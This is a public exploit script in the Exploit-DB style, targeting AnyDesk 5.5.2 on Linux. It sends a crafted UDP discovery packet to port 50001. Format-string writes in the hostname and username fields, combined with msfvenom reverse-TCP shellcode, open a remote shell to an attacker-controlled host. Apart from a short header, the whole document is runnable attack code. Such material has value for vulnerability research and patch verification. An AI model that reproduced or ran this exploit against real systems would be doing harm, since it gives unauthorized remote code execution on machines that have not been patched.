# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')